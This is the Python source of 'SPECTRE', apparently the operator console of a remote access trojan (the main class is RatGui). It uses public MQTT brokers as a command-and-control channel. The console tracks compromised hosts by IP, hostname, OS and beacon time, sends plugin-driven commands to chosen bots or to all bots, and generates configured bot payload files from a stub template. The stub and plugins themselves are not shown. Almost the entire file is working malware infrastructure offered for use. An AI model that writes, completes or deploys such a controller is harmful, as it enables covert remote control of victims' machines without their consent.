# SPECTRE.py (System for Persistent Execution, Control, and Targeted Remote Engagement)
import sys
import uuid
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, 
                             QPushButton, QTextEdit, QToolBar, QTableWidget, 
                             QTableWidgetItem, QMenu, QStatusBar, QDialog, 
                             QFormLayout, QLineEdit, QLabel, QComboBox)
from PyQt6.QtCore import Qt, QTimer, QDateTime, pyqtSignal, QObject
import paho.mqtt.client as mqtt
from paho.mqtt.client import CallbackAPIVersion
import json
from plugins import load_plugins

class MqttSignalHandler(QObject):
    message_received = pyqtSignal(dict)

class SettingsDialog(QDialog):
    def __init__(self, parent=None, history=[], topic='/commands/'):
        super().__init__(parent)
        self.setWindowTitle('Settings')
        self.setStyleSheet("""
            QDialog { background-color: #1a1a1a; color: #00ff00; }
            QLineEdit, QComboBox { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QLabel { 
                color: #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton { 
                background-color: #333333; 
                color: #00ff00; 
                padding: 8px; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton:hover { background-color: #444444; }
        """)
        layout = QFormLayout()
        self.broker_url = QComboBox()
        self.broker_url.setEditable(True)
        self.broker_url.addItems(history)
        self.broker_url.setCurrentText('broker.hivemq.com')
        self.broker_port = QLineEdit('1883')
        self.topic = QLineEdit(topic)
        self.api_token = QLineEdit()
        self.api_token.setPlaceholderText('API Token (optional for flespi)')
        layout.addRow('Broker URL:', self.broker_url)
        layout.addRow('Broker Port:', self.broker_port)
        layout.addRow('Topic:', self.topic)
        layout.addRow('API Token:', self.api_token)
        submit_button = QPushButton('Save')
        submit_button.clicked.connect(self.accept)
        layout.addWidget(submit_button)
        self.setLayout(layout)

class ServerDialog(QDialog):
    def __init__(self, title, parent=None, topic='/commands/'):
        super().__init__(parent)
        self.setWindowTitle(title)
        self.setStyleSheet("""
            QDialog { background-color: #1a1a1a; color: #00ff00; }
            QLineEdit, QComboBox { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QLabel { 
                color: #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton { 
                background-color: #333333; 
                color: #00ff00; 
                padding: 8px; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton:hover { background-color: #444444; }
        """)
        layout = QFormLayout()
        self.bot_name = QLineEdit('server')
        self.bot_id = QLabel(str(uuid.uuid4()))
        self.broker_url = QComboBox()
        self.broker_url.setEditable(True)
        self.broker_url.addItems(['broker.hivemq.com', 'mqtt.flespi.io'])
        self.broker_url.setCurrentText('broker.hivemq.com')
        self.api_token = QLineEdit()
        self.api_token.setPlaceholderText('API Token (optional)')
        self.encryption_key = QLineEdit(str(uuid.uuid4())[:16])
        self.topic = QLineEdit(topic)
        layout.addRow('Bot Name:', self.bot_name)
        layout.addRow('Bot ID:', self.bot_id)
        layout.addRow('Broker URL:', self.broker_url)
        layout.addRow('Topic:', self.topic)
        layout.addRow('API Token:', self.api_token)
        layout.addRow('Encryption Key:', self.encryption_key)
        submit_button = QPushButton('Create')
        submit_button.clicked.connect(self.accept)
        layout.addWidget(submit_button)
        self.setLayout(layout)

    def get_server_info(self):
        return {
            'name': self.bot_name.text(),
            'id': self.bot_id.text(),
            'broker_url': self.broker_url.currentText(),
            'topic': self.topic.text(),
            'api_token': self.api_token.text().replace("'", "\\'").replace('"', '\\"'),
            'key': self.encryption_key.text()
        }

class RatGui(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('SPECTRE')
        self.setMinimumSize(1200, 500)
        self.setStyleSheet("""
            QMainWindow { background-color: #1a1a1a; color: #00ff00; }
            QTableWidget { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                gridline-color: #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton { 
                background-color: #333333; 
                color: #00ff00; 
                padding: 8px; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton:hover { background-color: #444444; }
            QTextEdit { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QToolBar { background-color: #2a2a2a; border: 1px solid #00ff00; }
            QStatusBar { background-color: #2a2a2a; color: #00ff00; }
        """)
        self.device_status = {}
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage('Disconnected')

        toolbar = QToolBar('Server Actions')
        self.addToolBar(Qt.ToolBarArea.TopToolBarArea, toolbar)
        create_server_button = QPushButton('Create Server')
        create_server_button.clicked.connect(self.create_server)
        toolbar.addWidget(create_server_button)
        settings_button = QPushButton('Settings')
        settings_button.clicked.connect(self.open_settings)
        toolbar.addWidget(settings_button)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        self.device_table = QTableWidget()
        self.device_table.setRowCount(0)
        self.device_table.setColumnCount(6)  # Added hidden column for bot ID
        self.device_table.setHorizontalHeaderLabels(['IP Address', 'Host Name', 'OS', 'Status', 'Last Ping', 'Bot ID'])
        self.device_table.horizontalHeader().setStretchLastSection(True)
        self.device_table.setMinimumHeight(350)
        self.device_table.setColumnHidden(5, True)  # Hide the Bot ID column
        self.device_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.device_table.customContextMenuRequested.connect(self.show_context_menu)
        main_layout.addWidget(self.device_table)

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setMinimumHeight(100)
        self.log_area.append('Initialized SPECTRE with MQTT.')
        self.log_area.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.log_area.customContextMenuRequested.connect(self.show_log_context_menu)
        main_layout.addWidget(self.log_area)

        self.timer = QTimer()
        self.timer.timeout.connect(self.update_device_status)
        self.timer.start(10000)

        # Timer for MQTT loop
        self.mqtt_timer = QTimer()
        self.mqtt_timer.timeout.connect(self.process_mqtt)
        self.mqtt_timer.start(50)  # Run every 50ms

        self.client = mqtt.Client(callback_api_version=CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv5, client_id=f"spectre_gui_{uuid.uuid4()}")
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.client.on_disconnect = self.on_disconnect
        self.client.on_log = self.on_log

        # Signal handler for thread-safe updates
        self.signal_handler = MqttSignalHandler()
        self.signal_handler.message_received.connect(self.handle_message)

        self.broker_url = 'broker.hivemq.com'
        self.broker_port = 1883
        self.topic = '/commands/'
        self.broker_history = ['broker.hivemq.com', 'mqtt.flespi.io']
        self.plugins = load_plugins(self)
        self.connect_to_broker()

    def connect_to_broker(self):
        try:
            self.client.connect(self.broker_url, self.broker_port, 60)
            self.log_area.append(f"Connected to {self.broker_url}")
        except Exception as e:
            self.log_area.append(f"Error connecting to broker: {e}")

    def process_mqtt(self):
        # Process MQTT messages in the Qt event loop
        try:
            self.client.loop(0.01)  # Process for 10ms
        except Exception as e:
            self.log_area.append(f"MQTT loop error: {e}")

    def on_connect(self, client, userdata, flags, reason_code, properties=None):
        if reason_code == 0:
            # Clear any retained messages on the topic
            client.publish(self.topic, payload=None, qos=1, retain=True)
            self.log_area.append(f"GUI cleared retained messages on topic {self.topic}")
            client.subscribe(self.topic, qos=1)
            self.log_area.append("Connected to MQTT broker")
            self.status_bar.showMessage('Connected')
        else:
            self.log_area.append(f"GUI connection failed with code {reason_code}")
            self.status_bar.showMessage('Disconnected')

    def on_disconnect(self, client, userdata, rc):
        self.log_area.append(f"GUI disconnected from MQTT broker with code {rc}")
        self.status_bar.showMessage('Disconnected')

    def on_log(self, client, userdata, level, buf):
        # self.log_area.append(f"MQTT Log: {buf}")
        pass

    def on_message(self, client, userdata, msg, properties=None):
        try:
            message = msg.payload.decode('utf-8')
            if not message:  # Handle empty payload
                self.log_area.append("GUI received empty message, ignoring")
                return
            data = json.loads(message)
            # Emit signal to handle the message in the main thread
            self.signal_handler.message_received.emit(data)
        except Exception as e:
            self.log_area.append(f"Error processing message: {e}")

    def handle_message(self, data):
        try:
            if data.get('type') == 'connect':
                self.update_device_table(data)
            else:
                for plugin in self.plugins:
                    self.log_area.append(f"GUI dispatching message to plugin: {plugin.name}")
                    plugin.handle_response(data)
            if data.get('type') != 'connect':
                self.log_area.append(f"GUI received message on topic {self.topic}: {json.dumps(data)}")
        except Exception as e:
            self.log_area.append(f"Error handling message: {e}")

    def open_settings(self):
        dialog = SettingsDialog(self, self.broker_history, self.topic)
        if dialog.exec():
            self.broker_url = dialog.broker_url.currentText()
            self.broker_port = int(dialog.broker_port.text())
            self.topic = dialog.topic.text()
            if self.broker_url not in self.broker_history:
                self.broker_history.append(self.broker_url)
            self.client.disconnect()
            self.client = mqtt.Client(callback_api_version=CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv5, client_id=f"spectre_gui_{uuid.uuid4()}")
            self.client.on_connect = self.on_connect
            self.client.on_message = self.on_message
            self.client.on_disconnect = self.on_disconnect
            self.client.on_log = self.on_log
            self.connect_to_broker()

    def create_server(self):
        dialog = ServerDialog('Create Server', self, self.topic)
        if dialog.exec():
            server_info = dialog.get_server_info()
            server_info.update({
                'broker_url': self.broker_url,
                'broker_port': self.broker_port,
                'encryption_key': server_info['key']
            })
            self.generate_server_file(server_info)

    def generate_server_file(self, server_info):
        try:
            with open('SPECTRE_Stub.py', 'r') as f:
                bot_code = f.read()

            bot_code = bot_code.replace('{BROKER_URL}', server_info['broker_url'])
            bot_code = bot_code.replace('{BROKER_PORT}', str(server_info['broker_port']))
            bot_code = bot_code.replace('{TOPIC}', server_info['topic'])
            bot_code = bot_code.replace('{BOT_ID}', server_info['id'])
            bot_code = bot_code.replace('{API_TOKEN}', server_info['api_token'] if server_info['broker_url'] == 'mqtt.flespi.io' else '')

            filename = f"{server_info['name']}.py"
            with open(filename, "w") as f:
                f.write(bot_code)
            self.log_area.append(f"Generated bot file: {filename}")
        except Exception as e:
            self.log_area.append(f"Error generating bot script: {e}")

    def update_device_table(self, data):
        bot_id = data['id']
        ip = data.get('ip', 'Unknown')
        os_info = data.get('os', 'Unknown')
        hostname = data.get('hostname', 'Unknown')
        target = f"{ip}:{bot_id}"
        found = False
        for row in range(self.device_table.rowCount()):
            table_ip = self.device_table.item(row, 0).text()
            table_bot_id = self.device_table.item(row, 5).text()  # Bot ID column
            table_target = f"{table_ip}:{table_bot_id}"
            if table_target == target:
                self.device_table.setItem(row, 0, QTableWidgetItem(ip))
                self.device_table.setItem(row, 1, QTableWidgetItem(hostname))
                self.device_table.setItem(row, 2, QTableWidgetItem(os_info))
                self.device_table.setItem(row, 3, QTableWidgetItem('Connected'))
                self.device_table.setItem(row, 4, QTableWidgetItem(QDateTime.currentDateTime().toString()))
                self.device_table.setItem(row, 5, QTableWidgetItem(bot_id))
                self.device_status[target] = {'status': 'Connected', 'last_beacon': QDateTime.currentDateTime()}
                found = True
                break
        if not found:
            row = self.device_table.rowCount()
            self.device_table.insertRow(row)
            self.device_table.setItem(row, 0, QTableWidgetItem(ip))
            self.device_table.setItem(row, 1, QTableWidgetItem(hostname))
            self.device_table.setItem(row, 2, QTableWidgetItem(os_info))
            self.device_table.setItem(row, 3, QTableWidgetItem('Connected'))
            self.device_table.setItem(row, 4, QTableWidgetItem(QDateTime.currentDateTime().toString()))
            self.device_table.setItem(row, 5, QTableWidgetItem(bot_id))  # Store bot ID
            self.device_status[target] = {'status': 'Connected', 'last_beacon': QDateTime.currentDateTime()}

    def show_context_menu(self, position):
        menu = QMenu()
        selected = self.device_table.selectedItems()
        if selected:
            row = self.device_table.currentRow()
            bot_id = self.device_table.item(row, 5).text()  # Use Bot ID column
            ip = self.device_table.item(row, 0).text()
            target = f"{ip}:{bot_id}"
        else:
            target = 'all'

        for plugin in self.plugins:
            action = menu.addAction(plugin.get_menu_action())
            action.triggered.connect(lambda checked, t=target, p=plugin: p.execute(t))

        menu.exec(self.device_table.mapToGlobal(position))

    def remove_device_from_table(self, ip, bot_id):
        target = f"{ip}:{bot_id}"
        self.timer.stop()  # Stop the timer to prevent race conditions
        try:
            for row in range(self.device_table.rowCount()):
                table_ip = self.device_table.item(row, 0).text()
                table_bot_id = self.device_table.item(row, 5).text()  # Bot ID column
                table_target = f"{table_ip}:{table_bot_id}"
                if table_target == target:
                    self.device_table.removeRow(row)
                    if target in self.device_status:
                        del self.device_status[target]
                    break
        finally:
            self.timer.start(10000)  # Restart the timer

    def show_log_context_menu(self, position):
        menu = QMenu()
        clear_action = menu.addAction('Clear Log')
        action = menu.exec(self.log_area.mapToGlobal(position))
        if action == clear_action:
            self.log_area.clear()

    def update_device_status(self):
        try:
            current_time = QDateTime.currentDateTime()
            for row in range(self.device_table.rowCount()):
                bot_id = self.device_table.item(row, 5).text()  # Bot ID column
                ip = self.device_table.item(row, 0).text()
                target = f"{ip}:{bot_id}"
                if target in self.device_status:
                    seconds_ago = self.device_status[target]['last_beacon'].secsTo(current_time)
                    new_status = 'Connected' if seconds_ago < 30 else 'Disconnected'
                    self.device_status[target]['status'] = new_status
                    self.device_table.setItem(row, 3, QTableWidgetItem(new_status))
                    last_ping_text = 'Just now' if seconds_ago < 1 else f'{seconds_ago} seconds ago'
                    self.device_table.setItem(row, 4, QTableWidgetItem(last_ping_text))
        except Exception as e:
            self.log_area.append(f"Error updating device status: {e}")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = RatGui()
    window.show()
    sys.exit(app.exec())